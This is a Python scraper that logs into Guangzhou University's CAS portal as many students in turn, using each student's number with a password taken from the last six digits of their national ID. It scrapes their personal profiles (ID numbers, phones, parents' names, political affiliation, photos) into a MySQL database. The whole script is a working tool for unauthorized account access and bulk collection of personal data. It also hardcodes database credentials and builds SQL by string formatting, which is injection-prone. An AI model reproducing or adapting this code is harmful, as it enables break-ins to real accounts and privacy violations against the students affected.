#coding=utf-8

import requests
import re
import time
import pymysql

student_count = 0  # 
end = False  # 爬取结束

# 初始化爬虫
headers = {
        # "Host": "202.192.18.182",
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0',
        # "Referer": "http://202.192.18.182/xf_xsqxxxk.aspx?xh=1506100007&xm=%C1%F5%DB%DA&gnmkdm=N121203",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}

# 初始化数据库
sql = """
        CREATE TABLE IF NOT EXISTS gzdxuser(
                ID INT PRIMARY KEY AUTO_INCREMENT,
                USERNAME VARCHAR(20),
                REALNAME VARCHAR(20),
                SEX VARCHAR(20),
                BIRTHDAY VARCHAR(20),
                OLDSCHOOL VARCHAR(20),
                NATION VARCHAR(20),
                JIGUAN VARCHAR(20),
                PARTY VARCHAR(20),
                PHONE VARCHAR(20),
                MATHERNAME VARCHAR(20),
                FATHERNAME VARCHAR(20),
                ORIGIN VARCHAR(20),
                ORIGINPROVINCE VARCHAR(20),
                COLLEGE VARCHAR(20),
                MAJOR VARCHAR(20),
                CLASSES VARCHAR(20),
                SID VARCHAR(20),
                PIC VARCHAR(256)
          );
        """

db = pymysql.connect("localhost", "Acring", "Acring4ever", "gzdxstu")
db.set_charset("utf8")
cursor = db.cursor()
cursor.execute(sql)


class GZDXLogin(object):
    login_url = "https://cas.gzhu.edu.cn/cas_server/login"  # 登录地址
    info_url = ""
    getted_info = False
    headers = {
        "Host": "202.192.18.184",
        "Referer": "http://202.192.18.184/xs_main.aspx?xh=1506100007"
    }
    data = {
        "username": "",
        "password": "",
        "submit": '登录',
        "captcha": "",
        "warn": "true",
        "execution": "e1s1",
        "_eventId": "submit",
        "lt": ""  # 登录界面的隐藏元素
    }

    user_info = {
        "username": "",
        "real_name": "",
        "sex": "",
        "birthday": "",
        "old_school": "",
        "nation": "",
        "jiguan": "",
        "party": "",
        "phone": "",
        "mather_name": "",
        "father_name": "",
        "origin": "",
        "origin_province": "",
        "college": "",
        "major": "",
        "classes": "",
        "sid": "",
        "pic": ""
    }

    def __init__(self, myusername, mypassword):
        self.data["username"] = myusername
        self.data["password"] = mypassword
        self.info_url = "http://202.192.18.184/xsgrxx.aspx?xh={}&gnmkdm=N121501".format(myusername)

    def save(self):
        if not self.getted_info:
            return
        sql = """
                INSERT INTO gzdxuser(
                USERNAME ,
                REALNAME ,
                SEX ,
                BIRTHDAY ,
                OLDSCHOOL ,
                NATION ,
                JIGUAN ,
                PARTY ,
                PHONE ,
                MATHERNAME ,
                FATHERNAME ,
                ORIGIN ,
                ORIGINPROVINCE ,
                COLLEGE ,
                MAJOR ,
                CLASSES ,
                SID,
                PIC
                ) VALUES ('{0}','{1}', '{2}', '{3}', '{4}', '{5}', '{6}', '{7}', '{8}',
                            '{9}', '{10}', '{11}', '{12}', '{13}', '{14}', '{15}', '{16}', '{17}');

                """.format(self.user_info["username"], self.user_info["real_name"], self.user_info["sex"], self.user_info["birthday"],
                           self.user_info["old_school"], self.user_info["nation"], self.user_info["jiguan"], self.user_info["party"],
                           self.user_info["phone"],self.user_info["mather_name"],self.user_info["father_name"],self.user_info["origin"],
                           self.user_info["origin_province"],self.user_info["college"],self.user_info["major"],self.user_info["classes"],
                           self.user_info["sid"],self.user_info["pic"]
                           )
        try:
            cursor.execute(sql)
            db.commit()
            global student_count
            student_count += 1
            print(self.data["username"] + ": 保存信息成功")
            print(self.user_info)
        except pymysql.Error as e:
            print(e, self.data["username"] + ": 保存信息失败")
            return 0

    def get_url_info(self):  # 获取学生信息
        if self.login() == 0:
            return
        try:
            inf = s.get(self.info_url)
            username = re.findall('<span id="xh">(.*?)</span></TD>', inf.text, re.S)[0]
            self.user_info["username"] = username
            real_name = re.findall('<span id="xm">(.*?)</span></TD>', inf.text, re.S)[0]
            self.user_info["real_name"] = real_name
            sex = re.findall('<span id="lbl_xb">(.*?)</span></TD>', inf.text, re.S)[0]
            self.user_info["sex"] = sex
            birthday = re.findall('<span id="lbl_csrq">(.*?)</span></TD>', inf.text, re.S)[0]
            self.user_info["birthday"] = birthday
            old_school = re.findall('<span id="lbl_byzx">(.*?)</span></TD>', inf.text, re.S)[0]
            self.user_info["old_school"] = old_school
            nation = re.findall('<span id="lbl_mz">(.*?)</span></TD>', inf.text, re.S)[0]
            self.user_info["nation"] = nation
            jiguan = re.findall('<span id="lbl_jg">(.*?)</span></TD>', inf.text, re.S)[0]
            self.user_info["jiguan"] = jiguan
            party = re.findall('<span id="lbl_zzmm">(.*?)</span></TD>', inf.text, re.S)[0]
            self.user_info["party"] = party
            phone = re.findall('<span id="lbl_lxdh">(.*?)</span></TD>', inf.text, re.S)[0]
            self.user_info["phone"] = phone
            mather_name = re.findall('<span id="lbl_mqxm">(.*?)</span></TD>', inf.text, re.S)[0]
            self.user_info["mather_name"] = mather_name
            father_name = re.findall('<span id="lbl_fqxm">(.*?)</span></td>', inf.text, re.S)[0]
            self.user_info["father_name"] = father_name
            origin = re.findall('<span id="lbl_lydq">(.*?)</span></TD>', inf.text, re.S)[0]
            self.user_info["origin"] = origin
            origin_province = re.findall('<span id="lbl_lys">(.*?)</span></td>', inf.text, re.S)[0]
            self.user_info["origin_province"] = origin_province
            college = re.findall('<span id="lbl_xy">(.*?)</span></TD>', inf.text, re.S)[0]
            self.user_info["college"] = college
            major = re.findall('<span id="lbl_zymc">(.*?)</span></TD>', inf.text, re.S)[0]
            self.user_info["major"] = major
            classes = re.findall('<span id="lbl_xzb">(.*?)</span></TD>', inf.text, re.S)[0]
            self.user_info["classes"] = classes
            sid = re.findall('<span id="lbl_sfzh">(.*?)</span></TD>', inf.text, re.S)[0]
            self.user_info["sid"] = sid

            pic = s.get("http://202.192.18.184/readimagexs.aspx?xh=" + username)
            picname = ".pic\\{}_{}.jpg".format(self.user_info["username"], self.user_info["real_name"])
            with open(picname, "wb") as file:
                file.write(pic.content)
                self.user_info["pic"] = picname
            self.getted_info = True
        except Exception as e:
            print(e, self.data["username"] + ": 获取学生信息失败")

    def login(self):  # 登录数字广大
        self.get_hidden()
        if self.data["lt"] == "":
            print(self.data["username"] + ": 获取隐藏码失败")
            return 0
        try:
            login_inf = s.post(self.login_url, data=self.data)
            s.get('http://202.192.18.184/Login_gzdx.aspx')  # 重定向的前面地址一定要和这个一样
        except requests.exceptions.RequestException as e:
            print(e)
            return 0
        if login_inf.url != "http://my.gzhu.edu.cn/":
            print(self.data["username"] + ": 密码错误或其他原因登录失败")
            return 0
        return 1

    def get_hidden(self):  # 获取lt参数

        try:
            r = s.get(self.login_url,  timeout=5)
            self.data["lt"] = re.findall(r'name="lt" value="(.*?)"', r.text)[0]
        except requests.exceptions.RequestException as e:
            print(e, self.data["username"] + ": 获取隐藏码失败")


class Counter(object):  # 获取数据库的数据
    userlist = {

    }

    def __init__(self):
        sql = """
            SELECT USERNAME,SID FROM rjuser;
        """
        count = cursor.execute(sql)
        self.userlist = cursor.fetchall()

    def next_info(self):
        for result in self.userlist:
            username = result[0]
            password = result[1][-6:]
            yield username,password
        end = True

if __name__ == '__main__':
    counter = Counter()
    d = counter.next_info()
    i = 0
    for name, pw in d:
        s = requests.session()
        s.headers = headers
        gzdx_login = GZDXLogin(name, pw)
        gzdx_login.get_url_info()
        gzdx_login.save()
